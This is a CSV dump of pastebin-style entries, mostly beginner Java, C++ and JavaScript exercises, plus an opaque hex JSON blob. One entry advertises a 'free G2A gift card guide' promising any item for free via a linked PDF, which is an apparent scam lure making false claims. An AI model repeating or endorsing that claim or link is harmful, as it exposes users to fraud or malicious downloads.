id,title,username,language,date,content
TQuwgZ5j,data878,TestGuy1,JSON,Sunday 24th of March 2024 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'bf44a35532f3edf6fcca36c43757481b9900c413a954b8bc4f2a501b98efd82c03344cf4b527a5865d8668a8aedbac7956bbee36fe688f424023b8653e4effcb01bfc00a21cba7574f7398f608a46a9e7f1e61e24e0dabb29253c159d701cc3af3dbdc47cb269dcd13f0781724bd047ede1f4e20dda74d7a80de3c84dbad8a5a',
  otherdata: [
    '2835d2f50a8beba20ad931fa7afc5141',
    '333674182309aa80f25617ba518205d5',
    'a19db4cfa1329440a3ddd4648fa4efaa',
    '894f6ff3810142abd4bc70958a069c2c',
    '44f78cd1b393a6e6d3fc2aa673becb44',
    '96e77f0afecd9dfab461f29145c0d233',
    '7d643c634fb826170f0e416470d6c73f',
    'e22ada234f8b28a84517015de4ac820c'
  ]
}"
Db0QG7Jf,Untitled,Josif_tepe,C++,Sunday 24th of March 2024 06:45:40 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n, c, d, e;
    int tabaci, strana;
    cin >> tabaci >> strana;
    
    int S = 1;
    int E = tabaci * 4;
    
    for(int i = 0; i < tabaci; i++) {
        
        
        if(strana == S) {
            cout << S + 1 << "" "" << E - 1 << "" "" << E << endl;
        }
        else if(strana == S + 1) {
            cout << S << "" "" << E - 1 << "" "" << E << endl;
        }
        else if(strana == E - 1) {
            cout << S << "" "" << S + 1 << "" "" << E << endl;
        }
        else if(strana == E) {
            cout << S << "" "" << S + 1 << "" "" << E - 1 << endl;
        }
        S += 2;
        E -= 2;
    }
    
    
    return 0;
}
"
6dYCkXuk,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,PASUSW,GetText,Sunday 24th of March 2024 06:39:39 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
24 March 2024"
rhkQzcte,09. Ski Trip,GabrielHr00,Java,Sunday 24th of March 2024 06:30:14 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class SkiTrip {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int days = Integer.parseInt(scanner.nextLine());
        String roomType = scanner.nextLine();
        String grade = scanner.nextLine();

        int nights = days - 1;
        double finalSum = 0.0;

        if (roomType.equals(""room for one person"")) {
            finalSum = 18.0 * nights;

        } else if (roomType.equals(""apartment"")) {
            finalSum = 25.0 * nights;

            if (days < 10) {
                finalSum = finalSum * 0.70;
            } else if (days >= 10 && days <= 15) {
                finalSum = finalSum * 0.65;
            } else if (days > 15) {
                finalSum = finalSum * 0.50;
            }

        } else if (roomType.equals(""president apartment"")) {
            finalSum = 35.0 * nights;

            if (days < 10) {
                finalSum = finalSum * 0.90;
            } else if (days >= 10 && days <= 15) {
                finalSum = finalSum * 0.85;
            } else if (days > 15) {
                finalSum = finalSum * 0.80;
            }
        }

        if (grade.equals(""positive"")) {
            finalSum = finalSum * 1.25;
        } else {
            finalSum = finalSum * 0.90;
        }

        System.out.printf(""%.2f"", finalSum);
    }
}
"
02icvAqF,Numbers Convertor Extended,bAngelov,JavaScript,Sunday 24th of March 2024 06:30:08 AM CDT,"function solve() {

    const convertors = {
        ""decimal"": {
            ""binary"": number => Number(number).toString(2),
            ""hexadecimal"": number => Number(number).toString(16).toUpperCase(),
            ""octal"": number => Number(number).toString(8).toUpperCase(),
        },
        ""binary"":{
            ""decimal"": string => parseInt(string,2),
            ""hexadecimal"": string => parseInt(string,2).toString(16).toUpperCase(),
            ""octal"": string => parseInt(string,2).toString(8),
        },
        ""hexadecimal"":{
            ""decimal"": string => parseInt(string,16),
            ""binary"": string => parseInt(string,16).toString(2),
            ""octal"": string => parseInt(string,16).toString(8),
        },
        ""octal"":{
            ""decimal"": string => parseInt(string,8),
            ""binary"": string => parseInt(string,8).toString(2),
            ""hexadecimal"": string => parseInt(string,8).toString(16),
        }
    }

    const createOptions = (nameArray,selectElement)=>{
        selectElement.length = 0
        nameArray.forEach(name=>{
            const el = document.createElement(""option"")
            el.textContent = name[0].toUpperCase() + name.slice(1)
            el.value = name.toLowerCase()
            selectElement.add(el)
        })
    }

    const value = document.querySelector(""#input"")
    value.type = ""text""
    const convertToElement = document.querySelector(""#selectMenuTo"")
    const convertFromElement = document.querySelector(""#selectMenuFrom"")
    const outputElement = document.querySelector(""footer input"")
    convertToElement.remove(0)
    convertFromElement.remove(0)

    const updateFromList = () => createOptions(Object.keys(convertors),convertFromElement)
    const updateToList = () => createOptions(Object.keys(convertors[convertFromElement.value]),convertToElement)
    updateFromList()
    updateToList()

    function convert() {
        outputElement.value = convertors[convertFromElement.value][convertToElement.value](value.value)
    }

    document.querySelector(""#container button"").addEventListener(""click"", convert)
    document.querySelector(""#selectMenuFrom"").addEventListener(""change"", updateToList)

}"
ahLDXq82,08. On Time for the Exam,GabrielHr00,Java,Sunday 24th of March 2024 06:29:28 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class OnTimeForTheExam {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int examHour = Integer.parseInt(scanner.nextLine());
        int examMinutes = Integer.parseInt(scanner.nextLine());
        int arrivalHour = Integer.parseInt(scanner.nextLine());
        int arrivalMinutes = Integer.parseInt(scanner.nextLine());

        // calc exam time in minutes => (easier when working only with minutes)
        int timeForExam = (examHour * 60) + examMinutes;
        int timeForArrival = (arrivalHour * 60) + arrivalMinutes;

        // get difference between arrival time and exam time
        int diff = Math.abs(timeForArrival - timeForExam);

        // check if student is late (when timeForArrival > timeForExam)
        if(timeForArrival > timeForExam) {
            System.out.println(""Late"");

            // more than 1 hour late for the exam
            if(diff >= 60) {
                // convert back into hours/minutes
                int hour = diff / 60;
                int minutes = diff % 60;
                // %02d -> check if minutes are < 10, then insert 0 infront, if not - don't do anything
                System.out.printf(""%d:%02d hours after the start"", hour, minutes);
            } else{
                System.out.printf(""%d minutes after the start"", diff);
            }
        }
        // check for arrival on time or earlier, but not more than 30 mins
        else if(timeForExam == timeForArrival || diff <= 30) {
            System.out.println(""On Time"");

            // check for minutes before the start
            if(diff >= 1 && diff <= 30) {
                System.out.printf(""%d minutes before the start"", diff);
            }
        }
        else {
            System.out.println(""Early"");
            // more than 1 hour early for the exam
            if(diff >= 60) {
                // convert back into hours/minutes
                int hour = diff / 60;
                int minutes = diff % 60;
                // %02d -> check if minutes are < 10, then insert 0 infront, if not - don't do anything
                System.out.printf(""%d:%02d hours before the start"", hour, minutes);
            } else{
                System.out.printf(""%d minutes before the start"", diff);
            }
        }

    }
}
"
TjizkYPU,07. Hotel Room,GabrielHr00,Java,Sunday 24th of March 2024 06:28:30 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class HotelRoom {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        String month = scanner.nextLine();
        int nights = Integer.parseInt(scanner.nextLine());

        double studioPrice = 0.0;
        double apartmentPrice = 0.0;

        if (month.equals(""May"") || month.equals(""October"")) {
            studioPrice = 50.0 * nights;
            apartmentPrice = 65.0 * nights;

            if(nights > 7 && nights <= 14) {
                //studioPrice = studioPrice - (studioPrice * 0.05);
                studioPrice = studioPrice * 0.95;
            } else if (nights > 14) {
                //studioPrice = studioPrice - (studioPrice * 0.30);
                studioPrice = studioPrice * 0.70;
                apartmentPrice = apartmentPrice * 0.90;
            }
        }
        else if (month.equals(""June"") || month.equals(""September"")) {
            studioPrice = 75.20 * nights;
            apartmentPrice = 68.70 * nights;

            if (nights > 14) {
                //studioPrice = studioPrice - (studioPrice * 0.20);
                studioPrice = studioPrice * 0.80;
                apartmentPrice = apartmentPrice * 0.90;
            }
        }
        else if (month.equals(""July"") || month.equals(""August"")) {
            studioPrice = 76.0 * nights;
            apartmentPrice = 77.0 * nights;

            if(nights > 14) {
                apartmentPrice = apartmentPrice * 0.90;
            }
        }

        System.out.printf(""Apartment: %.2f lv.%nStudio: %.2f lv."", apartmentPrice, studioPrice);

    }
}"
JVNEDGWk,06. Operations Between Numbers,GabrielHr00,Java,Sunday 24th of March 2024 06:27:27 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class OperationsBetweenNumbers {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int n1 = Integer.parseInt(scanner.nextLine());
        int n2 = Integer.parseInt(scanner.nextLine());
        char operator = scanner.nextLine().charAt(0);

        if (operator == '+') {
            int result = n1 + n2;

            if (result % 2 == 0) {
                System.out.printf(""%d %c %d = %d - even"", n1, operator, n2, result);
            } else {
                System.out.printf(""%d %c %d = %d - odd"", n1, operator, n2, result);
            }

        } else if (operator == '-') {
            int result = n1 - n2;

            if (result % 2 == 0) {
                System.out.printf(""%d %c %d = %d - even"", n1, operator, n2, result);
            } else {
                System.out.printf(""%d %c %d = %d - odd"", n1, operator, n2, result);
            }
        }
        else if (operator == '*') {
            int result = n1 * n2;

            if (result % 2 == 0) {
                System.out.printf(""%d %c %d = %d - even"", n1, operator, n2, result);
            } else {
                System.out.printf(""%d %c %d = %d - odd"", n1, operator, n2, result);
            }
        }
        else if (operator == '/') {
            if (n2 == 0) {
                System.out.printf(""Cannot divide %d by zero"", n1);
            } else {
                double result = n1 / (1.0 * n2);
                System.out.printf(""%d %c %d = %.2f"", n1, operator, n2, result);
            }
        }
        else if (operator == '%') {
            if (n2 == 0) {
                System.out.printf(""Cannot divide %d by zero"", n1);
            } else {
                int result = n1 % n2;
                System.out.printf(""%d %c %d = %d"", n1, operator, n2, result);
            }
        }

    }
}
"
RFxCgqbr,05. Journey,GabrielHr00,Java,Sunday 24th of March 2024 06:26:38 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class Journey {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        double budget = Double.parseDouble(scanner.nextLine());
        String season = scanner.nextLine();

        String destination = """";
        String rest = """";
        double spentMoney = 0.0;

        if(budget <= 100) {
            destination = ""Bulgaria"";
            if(season.equals(""summer"")) {
                rest = ""Camp"";
                spentMoney = budget * 0.30;
            } else if(season.equals(""winter"")) {
                rest = ""Hotel"";
                spentMoney = budget * 0.70;
            }
        }
        else if (budget <= 1000) {
            destination = ""Balkans"";
            if(season.equals(""summer"")) {
                rest = ""Camp"";
                spentMoney = budget * 0.40;
            } else if(season.equals(""winter"")) {
                rest = ""Hotel"";
                spentMoney = budget * 0.80;
            }
        }
        else if (budget > 1000) {
            destination = ""Europe"";
            rest = ""Hotel"";
            spentMoney = budget * 0.90;
        }

        System.out.printf(""Somewhere in %s%n%s - %.2f"", destination, rest, spentMoney);
    }
}"
9J8fSKSa,04. Fishing Boat,GabrielHr00,Java,Sunday 24th of March 2024 06:25:35 AM CDT,"package _03_ConditionalStatementsAdvanced;

import java.util.Scanner;

public class FishingBoat {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int budget = Integer.parseInt(scanner.nextLine());
        String season = scanner.nextLine();
        int fishersCount = Integer.parseInt(scanner.nextLine());

        double boatRent = 0.0;
        switch (season) {
            case ""Spring"":
                boatRent = 3000.0;
                break;
            case ""Summer"":
            case ""Autumn"":
                boatRent = 4200.0;
                break;
            case ""Winter"":
                boatRent = 2600.0;
                break;
        }

        if (fishersCount <= 6) {
            boatRent = boatRent * 0.90;
        } else if (fishersCount >= 7 && fishersCount <= 11) {
            boatRent = boatRent * 0.85;
        } else if (fishersCount >= 12) {
            boatRent = boatRent * 0.75;
        }

        if (fishersCount % 2 == 0 && !(season.equals(""Autumn"")) ) {
            boatRent = boatRent * 0.95;
        }

        double diff = Math.abs(budget - boatRent);
        if (budget >= boatRent) {
            System.out.printf(""Yes! You have %.2f leva left."", diff);
        } else {
            System.out.printf(""Not enough money! You need %.2f leva."", diff);
        }

    }
}
"
